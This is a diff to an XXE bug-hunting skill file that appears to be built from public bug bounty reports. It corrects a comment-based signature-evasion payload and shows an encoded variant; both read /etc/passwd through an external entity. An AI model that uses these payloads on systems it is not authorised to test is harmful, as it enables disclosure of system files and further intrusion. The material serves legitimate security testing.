@@ -1,9 +1,11 @@
 ---
 name: hunt-xxe
-description: Hunting skill for xxe vulnerabilities. Built from 10 public bug bounty reports including SVG-upload XXE, Office-doc (PPTX/DOCX) XXE, SOAP XXE, SAML AssertionConsumer XXE, blind OOB XXE via DTD callback, parameter-entity XXE, XXE-to-LFI, XXE-to-SSRF, and XXE-to-RCE chains (Adobe Commerce CosmicSting CVE-2024-34102). Use when hunting XXE on any target — emphasis on OOB-Or-It-Didn't-Happen Gate for blind cases.
+description: "Hunting skill for XXE vulnerabilities. Built from 10 public bug bounty reports including SVG-upload XXE, Office-doc (PPTX/DOCX) XXE, SOAP XXE, SAML AssertionConsumer XXE, blind OOB XXE via DTD callback, parameter-entity XXE, XXE-to-LFI, XXE-to-SSRF, and XXE-to-RCE chains (Adobe Commerce CosmicSting CVE-2024-34102). Use when hunting XXE on any target — emphasis on OOB-Or-It-Didn't-Happen Gate for blind cases."
 sources: github, hackerone_public, assetnote_research, splunk_security
 report_count: 10
 ---
+
+# HUNT-XXE — XML External Entity Injection
 
 ## Crown Jewel Targets
 
@@ -250,7 +252,7 @@ Transfer-Encoding: chunked
 <!-- HTTP request splitting with XML payload spread across chunks -->
 
 <!-- Use XML comments to break signatures -->
-<!-–- -->DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!-- --><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 
 <!-- Nested encoding -->
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;:///etc/passwd">]>
